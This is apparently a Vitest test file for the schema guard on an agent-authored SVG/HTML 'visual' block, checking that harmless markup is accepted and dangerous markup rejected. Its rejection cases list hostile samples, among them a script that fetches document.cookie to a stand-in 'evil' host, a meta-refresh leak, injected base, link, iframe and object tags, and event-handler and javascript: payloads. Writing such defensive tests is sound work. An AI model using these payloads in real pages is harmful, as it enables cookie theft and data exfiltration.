import { describe, expect, it } from 'vitest'
import { Block } from './blocks.js'

// The `visual` block carries agent-authored static SVG/HTML. The real security
// boundary is the sandboxed iframe in the renderer; these schema guards are
// defense-in-depth that reject the obvious script/navigation/exfil vectors before
// the markup ever reaches the DOM.
describe('VisualBlock', () => {
  it('accepts a minimal svg visual sized by aspectRatio', () => {
    const r = Block.safeParse({
      id: 'v', type: 'visual', format: 'svg', aspectRatio: 16 / 9,
      source: '<svg viewBox="0 0 16 9"><rect width="16" height="9" fill="var(--bg-2)"/></svg>',
    })
    expect(r.success).toBe(true)
  })

  it('accepts a minimal html visual sized by an explicit height', () => {
    const r = Block.safeParse({
      id: 'v', type: 'visual', format: 'html', height: 200,
      source: '<div style="padding:8px;color:var(--ink)">hello</div>',
    })
    expect(r.success).toBe(true)
  })

  it.each([
    ['inline <script>', '<svg><script>fetch("//evil/"+document.cookie)</script></svg>'],
    ['uppercase <SCRIPT>', '<div><SCRIPT>x()</SCRIPT></div>'],
    ['event handler', '<svg onload="x()"></svg>'],
    ['javascript: url', '<a href="javascript:alert(1)">x</a>'],
    ['<meta http-equiv refresh>', '<meta http-equiv="refresh" content="0;url=https://evil/?leak">'],
    ['<base>', '<base href="https://evil/">'],
    ['<link>', '<link rel="stylesheet" href="https://evil/x.css">'],
    ['nested iframe', '<iframe src="https://evil/"></iframe>'],
    ['object embed', '<object data="https://evil/"></object>'],
    ['SMIL animation', '<svg><animate attributeName="x" to="9"/></svg>'],
    ['doctype/DTD', '<!DOCTYPE html><div>x</div>'],
  ])('rejects %s', (_label, source) => {
    expect(Block.safeParse({ id: 'v', type: 'visual', format: 'html', height: 200, source }).success).toBe(false)
  })

  it('rejects an oversized source', () => {
    expect(Block.safeParse({
      id: 'v', type: 'visual', format: 'html', height: 200, source: 'x'.repeat(24_001),
    }).success).toBe(false)
  })

  it('rejects out-of-bounds aspectRatio and height', () => {
    expect(Block.safeParse({ id: 'v', type: 'visual', format: 'svg', aspectRatio: 0, source: '<svg/>' }).success).toBe(false)
    expect(Block.safeParse({ id: 'v', type: 'visual', format: 'html', height: 10, source: '<div></div>' }).success).toBe(false)
    expect(Block.safeParse({ id: 'v', type: 'visual', format: 'html', height: 9999, source: '<div></div>' }).success).toBe(false)
  })
})
